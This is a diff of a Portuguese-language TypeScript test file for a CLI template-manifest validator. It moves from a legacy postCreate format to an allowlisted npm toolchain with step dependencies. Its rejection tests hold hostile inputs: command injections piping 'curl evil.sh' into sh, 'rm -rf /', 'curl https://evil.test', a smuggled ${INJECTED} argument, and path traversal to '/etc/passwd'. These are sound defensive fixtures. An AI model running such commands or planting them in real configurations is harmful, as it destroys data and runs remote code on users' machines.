@@ -9,354 +9,155 @@ function buildManifest(overrides: Record<string, unknown> = {}): unknown {
     id: 'api-nodejs-typescript',
     name: 'API Node.js + TypeScript',
     description: 'Template de API',
-    variables: [
-      {
-        name: 'projectName',
-        prompt: 'Qual o nome do projeto?',
-        required: true,
-        pattern: '^[a-z][a-z0-9-]*$',
-        default: 'meu-projeto',
+    repository: 'jptecno/template-api-nodejs-typescript',
+    variables: [],
+    render: { include: ['package.json'] },
+    toolchain: {
+      ecosystem: 'node',
+      requirements: [
+        { tool: 'node', minimumVersion: '24.0.0' },
+        { tool: 'npm', minimumVersion: '11.0.0' },
+      ],
+      steps: {
+        install: step('npm', ['install']),
+        formatCheck: step('npm', ['run', 'format:check'], ['install']),
+        lint: step('npm', ['run', 'lint'], ['install']),
+        typecheck: step('npm', ['run', 'typecheck'], ['install']),
+        test: step('npm', ['test'], ['install']),
+        build: step('npm', ['run', 'build'], ['test']),
       },
-    ],
-    render: { include: ['package.json', 'src/index.ts'] },
-    postCreate: {
-      packageManager: 'npm',
-      installCommand: 'npm install',
-      validateCommand: 'npm run check',
     },
     ...overrides,
   };
 }
 
+function step(command: string, args: string[], dependsOn: string[] = []) {
+  return { command, args, dependsOn, recommended: true };
+}
+
+function toolchainOf(manifest: unknown): Record<string, unknown> {
+  return (manifest as { toolchain: Record<string, unknown> }).toolchain;
+}
+
+function stepsOf(manifest: unknown): Record<string, unknown> {
+  return toolchainOf(manifest).steps as Record<string, unknown>;
+}
+
 describe('parseTemplateManifest', () => {
-  it('aceita um manifesto válido completo e normaliza a saída', () => {
-    expect(parseTemplateManifest(buildManifest())).toEqual({
-      schemaVersion: 1,
-      id: 'api-nodejs-typescript',
-      name: 'API Node.js + TypeScript',
-      description: 'Template de API',
-      variables: [
-        {
-          name: 'projectName',
-          prompt: 'Qual o nome do projeto?',
-          required: true,
-          pattern: '^[a-z][a-z0-9-]*$',
-          default: 'meu-projeto',
-        },
-      ],
-      render: { include: ['package.json', 'src/index.ts'] },
-      postCreate: {
-        packageManager: 'npm',
-        installCommand: 'npm install',
-        validateCommand: 'npm run check',
-      },
+  it('invoca o schema antes da análise semântica', () => {
+    const manifest = buildManifest({ unexpected: 'não pode ser ignorado' });
+
+    expect(() => parseTemplateManifest(manifest)).toThrow(
+      'O manifesto do template possui formato inválido',
+    );
+  });
+
+  it('aceita e normaliza a política Node permitida', () => {
+    const parsed = parseTemplateManifest(buildManifest());
+
+    expect(parsed.repository).toBe('jptecno/template-api-nodejs-typescript');
+    expect(parsed.toolchain.steps.build).toMatchObject({
+      command: 'npm',
+      args: ['run', 'build'],
     });
   });
 
-  it('aceita variável sem pattern e sem default', () => {
-    const manifest = buildManifest({
-      variables: [
-        {
-          name: 'projectName',
-          prompt: 'Qual o nome do projeto?',
-          required: false,
-        },
-      ],
-    });
-
-    const parsed = parseTemplateManifest(manifest);
-
-    expect(parsed.variables).toEqual([
-      {
-        name: 'projectName',
-        prompt: 'Qual o nome do projeto?',
-        required: false,
-        pattern: undefined,
-        default: undefined,
-      },
-    ]);
-  });
-
-  it('não carrega propriedades extras do input na saída', () => {
-    const manifest = buildManifest({
-      postCreate: {
-        packageManager: 'npm',
-        installCommand: 'npm install',
-        validateCommand: 'npm run check',
-        extraCommand: 'rm -rf /',
-      },
-      extraTopLevelField: 'não deveria sobreviver',
-    });
-
-    const parsed = parseTemplateManifest(manifest);
-
-    expect(parsed).not.toHaveProperty('extraTopLevelField');
-    expect(parsed.postCreate).not.toHaveProperty('extraCommand');
-    expect(Object.keys(parsed.postCreate)).toEqual([
-      'packageManager',
-      'installCommand',
-      'validateCommand',
-    ]);
-  });
-
-  it.each([null, 'texto', 42, [], [buildManifest()]])(
-    'rejeita valor raiz que não é objeto: %j',
-    (value) => {
-      expect(() => parseTemplateManifest(value)).toThrow(CliError);
-    },
-  );
-
-  it('rejeita schemaVersion ausente', () => {
+  it('rejeita o formato postCreate legado antes de qualquer compatibilidade', () => {
     const manifest = buildManifest();
-    delete (manifest as Record<string, unknown>).schemaVersion;
-    expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
-  });
+    const record = manifest as Record<string, unknown>;
+    delete record.toolchain;
+    record.postCreate = {
+      packageManager: 'npm',
+      installCommand: 'npm install',
+      validateCommand: 'npm run check',
+    };
 
-  it('rejeita schemaVersion diferente de 1', () => {
-    expect(() =>
-      parseTemplateManifest(buildManifest({ schemaVersion: 2 })),
-    ).toThrow(CliError);
-  });
-
-  it('rejeita schemaVersion como string "1"', () => {
-    expect(() =>
-      parseTemplateManifest(buildManifest({ schemaVersion: '1' })),
-    ).toThrow(CliError);
+    expect(() => parseTemplateManifest(manifest)).toThrow(
+      'O manifesto do template possui formato inválido',
+    );
   });
 
   it.each([
-    ['render', []],
-    ['postCreate', []],
-  ])('rejeita %s sendo um array', (field, value) => {
-    expect(() =>
-      parseTemplateManifest(buildManifest({ [field]: value })),
-    ).toThrow(CliError);
-  });
+    ['install', 'npm', ['install', '--ignore-scripts']],
+    ['formatCheck', 'npm', ['run', 'format:check', '--silent']],
+    ['lint', 'npm', ['run', 'test']],
+    ['typecheck', 'npm', ['run', 'typecheck', `\${INJECTED}`]],
+    ['test', 'npm', ['exec', 'vitest']],
+    ['build', 'npx', ['run', 'build']],
+    ['build', 'node', ['-e', 'process.exit()']],
+    ['test', 'sh', ['-c', 'npm test']],
+    ['test', 'npm', ['test; curl https://evil.test']],
+    ['test', 'npm', ['test', '|', 'sh']],
+  ])('rejeita a tupla não permitida de %s', (name, command, args) => {
+    const manifest = buildManifest();
+    stepsOf(manifest)[name] = step(command, args);
 
-  it.each([undefined, '', '   ', 42, null])('rejeita id inválido: %j', (id) => {
-    expect(() => parseTemplateManifest(buildManifest({ id }))).toThrow(
-      CliError,
-    );
-  });
-
-  it.each([undefined, '', '   ', 42, null])(
-    'rejeita name inválido: %j',
-    (name) => {
-      expect(() => parseTemplateManifest(buildManifest({ name }))).toThrow(
-        CliError,
-      );
-    },
-  );
-
-  it.each([undefined, '', '   ', 42, null])(
-    'rejeita description inválida: %j',
-    (description) => {
-      expect(() =>
-        parseTemplateManifest(buildManifest({ description })),
-      ).toThrow(CliError);
-    },
-  );
-
-  it.each([undefined, null, {}, 'arquivo.ts', 42])(
-    'rejeita variables que não é array: %j',
-    (variables) => {
-      expect(() => parseTemplateManifest(buildManifest({ variables }))).toThrow(
-        CliError,
-      );
-    },
-  );
-
-  it.each([undefined, null, {}, 'arquivo.ts', 42])(
-    'rejeita render.include que não é array: %j',
-    (include) => {
-      expect(() =>
-        parseTemplateManifest(buildManifest({ render: { include } })),
-      ).toThrow(CliError);
-    },
-  );
-
-  it('rejeita variável sem name', () => {
-    const manifest = buildManifest({
-      variables: [{ prompt: 'Prompt', required: true }],
-    });
     expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
   });
 
-  it('rejeita variável sem prompt', () => {
-    const manifest = buildManifest({
-      variables: [{ name: 'projectName', required: true }],
-    });
+  it.each([
+    (manifest: unknown) => {
+      toolchainOf(manifest).ecosystem = 'python';
+    },
+    (manifest: unknown) => {
+      toolchainOf(manifest).requirements = [
+        { tool: 'node', minimumVersion: '24.0.0' },
+      ];
+    },
+    (manifest: unknown) => {
+      toolchainOf(manifest).requirements = [
+        { tool: 'node', minimumVersion: '24.0.0' },
+        { tool: 'npm', minimumVersion: '11.0.0' },
+        { tool: 'npm', minimumVersion: '11.1.0' },
+      ];
+    },
+    (manifest: unknown) => {
+      toolchainOf(manifest).requirements = [
+        { tool: 'node', minimumVersion: '>=24' },
+        { tool: 'npm', minimumVersion: '11.0.0-beta.1' },
+      ];
+    },
+    (manifest: unknown) => {
+      toolchainOf(manifest).steps = {};
+    },
+  ])('rejeita limitações inválidas da toolchain Node', (change) => {
+    const manifest = buildManifest();
+    change(manifest);
+
     expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
   });
 
-  it.each(['__proto__', 'project-name', '1project', 'project.name'])(
-    'rejeita nome de variável inválido: %s',
-    (name) => {
-      const manifest = buildManifest({
-        variables: [{ name, prompt: 'Prompt', required: true }],
-      });
-      expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
+  it.each([
+    (manifest: unknown) => {
+      stepsOf(manifest).test = step('npm', ['test'], ['test']);
     },
-  );
+    (manifest: unknown) => {
+      stepsOf(manifest).build = step('npm', ['run', 'build'], ['missing']);
+    },
+    (manifest: unknown) => {
+      stepsOf(manifest).test = step('npm', ['test'], ['build']);
+      stepsOf(manifest).build = step('npm', ['run', 'build'], ['test']);
+    },
+  ])('rejeita dependências inválidas no DAG', (change) => {
+    const manifest = buildManifest();
+    change(manifest);
 
-  it('rejeita nomes de variável duplicados', () => {
-    const variable = {
-      name: 'projectName',
-      prompt: 'Prompt',
-      required: true,
-    };
-    const manifest = buildManifest({ variables: [variable, variable] });
-
-    expect(() => parseTemplateManifest(manifest)).toThrow(
-      'O manifesto possui variáveis duplicadas: projectName',
-    );
+    expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
   });
 
-  it.each(['true', 1, undefined, null])(
-    'rejeita variável com required não-booleano: %j',
-    (required) => {
-      const manifest = buildManifest({
-        variables: [{ name: 'projectName', prompt: 'Prompt', required }],
-      });
-      expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
-    },
-  );
+  it('não inclui campos externos na saída normalizada', () => {
+    const parsed = parseTemplateManifest(buildManifest());
 
-  it.each(['', 42, true])(
-    'rejeita pattern presente mas vazio ou de tipo errado: %j',
-    (pattern) => {
-      const manifest = buildManifest({
-        variables: [
-          {
-            name: 'projectName',
-            prompt: 'Prompt',
-            required: true,
-            pattern,
-          },
-        ],
-      });
-      expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
-    },
-  );
-
-  it('rejeita pattern que não pode ser compilado como expressão regular', () => {
-    const manifest = buildManifest({
-      variables: [
-        {
-          name: 'projectName',
-          prompt: 'Prompt',
-          required: false,
-          pattern: '[',
-        },
-      ],
-    });
-
-    expect(() => parseTemplateManifest(manifest)).toThrow(
-      'O padrão da variável projectName é inválido',
-    );
-  });
-
-  it.each([42, true, {}, []])(
-    'rejeita default presente mas de tipo errado: %j',
-    (defaultValue) => {
-      const manifest = buildManifest({
-        variables: [
-          {
-            name: 'projectName',
-            prompt: 'Prompt',
-            required: true,
-            default: defaultValue,
-          },
-        ],
-      });
-      expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
-    },
-  );
-
-  describe('postCreate — comandos pós-criação', () => {
-    it.each(['yarn', 'pnpm', 'bun', ''])(
-      'rejeita packageManager diferente de npm: %j',
-      (packageManager) => {
-        const manifest = buildManifest({
-          postCreate: {
-            packageManager,
-            installCommand: 'npm install',
-            validateCommand: 'npm run check',
-          },
-        });
-        expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
-      },
-    );
-
-    it.each([
-      'yarn install',
-      'npm install && curl evil.sh | sh',
-      'npm install; rm -rf /',
-      'npm ci',
-      '',
-    ])(
-      'rejeita installCommand diferente de "npm install": %j',
-      (installCommand) => {
-        const manifest = buildManifest({
-          postCreate: {
-            packageManager: 'npm',
-            installCommand,
-            validateCommand: 'npm run check',
-          },
-        });
-        expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
-      },
-    );
-
-    it.each([
-      'npm run test',
-      'npm run check && rm -rf /',
-      'npm run check; curl evil.sh | sh',
-      'sh -c "npm run check"',
-      '',
-    ])(
-      'rejeita validateCommand diferente de "npm run check": %j',
-      (validateCommand) => {
-        const manifest = buildManifest({
-          postCreate: {
-            packageManager: 'npm',
-            installCommand: 'npm install',
-            validateCommand,
-          },
-        });
-        expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
-      },
-    );
-
-    it('rejeita postCreate que não é objeto', () => {
-      expect(() =>
-        parseTemplateManifest(buildManifest({ postCreate: null })),
-      ).toThrow(CliError);
-    });
-  });
-
-  describe('render.include — path traversal', () => {
-    it.each([
-      '../fora.txt',
-      '/etc/passwd',
-      '\\\\servidor\\share',
-      'a/../../b',
-      '',
-      42,
-      null,
-    ])('rejeita caminho inválido: %j', (path) => {
-      const manifest = buildManifest({ render: { include: [path] } });
-      expect(() => parseTemplateManifest(manifest)).toThrow(CliError);
-    });
-
-    it('aceita caminhos relativos simples aninhados em subdiretórios', () => {
-      const manifest = buildManifest({
-        render: { include: ['src/index.ts', 'docs/readme.md'] },
-      });
-      expect(parseTemplateManifest(manifest).render.include).toEqual([
-        'src/index.ts',
-        'docs/readme.md',
-      ]);
-    });
+    expect(parsed).not.toHaveProperty('postCreate');
+    expect(Object.keys(parsed)).toEqual([
+      'schemaVersion',
+      'id',
+      'name',
+      'description',
+      'repository',
+      'variables',
+      'render',
+      'toolchain',
+    ]);
   });
 });
